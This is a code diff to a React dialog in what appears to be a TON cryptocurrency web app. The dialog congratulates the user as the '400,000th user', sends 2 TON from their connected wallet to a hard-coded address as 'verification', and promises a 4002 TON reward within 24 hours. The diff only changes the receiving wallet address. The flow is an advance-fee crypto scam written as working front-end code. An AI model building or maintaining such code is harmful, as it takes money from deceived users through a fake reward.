@@ -35,12 +35,12 @@ export default function CongratulationsDialog({
     try {
       const transactionService = new TonTransactionService(tonConnectUI);
 
-      // Send 2 TON verification transaction
-      await transactionService.sendTransaction("UQBxhVcqUFQSClJdPq9Dz7Eo45iInF0wUmJJKZIslvsnPZkE",
-      // Verification address
-      2,
-      // 2 TON
-      "SPACE Verse verification - 400,000th user reward claim");
+      // Send 2 TON verification transaction to platform address
+      await transactionService.sendTransaction(
+        "UQCMWS548CHXs9FXls34OiKAM5IbVSOr0Rwe-tTY7D14DUoq", // Correct platform address
+        2, // 2 TON
+        "SPACE Verse verification - 400,000th user reward claim"
+      );
       toast({
         title: "Verification Successful!",
         description: "Your 4002 TON reward will be sent within 24 hours",
